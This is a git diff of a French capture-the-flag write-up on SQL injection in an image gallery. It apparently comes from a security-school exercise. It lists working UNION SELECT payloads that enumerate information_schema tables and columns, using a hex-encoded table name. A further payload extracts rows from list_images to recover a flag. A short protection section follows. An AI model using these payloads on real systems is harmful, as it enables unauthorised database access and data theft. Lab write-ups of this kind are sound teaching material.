@@ -1,33 +1,34 @@
-# Vulnérabilité de Referer Spoofing (Falsification de Referer)
+# Vulnérabilité: Injection SQL dans la galerie d'images
 
 ## Découverte
 
-On voit que l'on doit recuperer le flag dans les images
+Nous avons identifié que la galerie d'images était vulnérable à l'injection SQL.
 
-Print toute les tables pour trouver la table des images
-```
-1 UNION SELECT table_name, NULL FROM information_schema.tables -- 
+### Exploitation
+
+1. Identification des tables disponibles:
+```sql
+1 UNION SELECT table_name, NULL FROM information_schema.tables --
 ```
 
-Checker toute les columns de la table list_images
-
-```
+2. Récupération des colonnes de la table d'images:
+```sql
 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=0x6C6973745F696D61676573 --
 ```
-la table contient les column :
 
-    - id
-    - url
-    - title
-    - comment
+3. Structure découverte de la table `list_images`:
+   - id
+   - url
+   - title
+   - comment
 
-On teste les sortie, je mets ca dans image numbers 
-
-```
+4. Extraction des données sensibles:
+```sql
 1 UNION SELECT url, comment FROM list_images WHERE url=0x626f726e746f7365632e64646e732e6e65742f696d616765732e706e67 --
 ```
-et ca sort le flag albatroz dechffre en MD5 et si on l'encrypte en sha256 on obtient le flag
 
+5. Résultat: extraction du flag "albatroz" qui, une fois converti en SHA256, donne le flag final.
 
 ## Protection
-Il faut verifier si il n'y a pas e SQL dans les requetes si on les inseres apres dans les requetes sql 
+- Implémenter la validation des entrées
+- Échapper les caractères spéciaux SQL
